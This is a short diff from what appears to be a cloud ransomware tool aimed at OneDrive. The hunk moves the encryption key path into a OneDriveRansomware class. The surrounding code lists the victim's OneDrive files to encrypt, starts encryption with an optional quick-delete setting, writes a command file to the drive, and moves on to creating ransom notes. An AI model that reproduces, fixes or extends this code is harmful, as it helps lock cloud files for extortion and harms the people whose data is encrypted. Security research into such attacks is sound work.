@@ -102,8 +102,8 @@ def main():
         onedrive_session.create_file(f"/{configs[ConfigKey.CMD_FILE_NAME.value]}", json.dumps(cmd_dict).encode(), modify_if_exists=True)
 
     if args.remote_ransomware:
-        onedrive_ransomware = OneDriveRansomware(onedrive_session)
-        all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session, args.key_path)
+        onedrive_ransomware = OneDriveRansomware(onedrive_session, args.key_path)
+        all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session)
         onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, quick_delete=configs[ConfigKey.QUICK_DELETE.value])
         
         # Create ransom notes
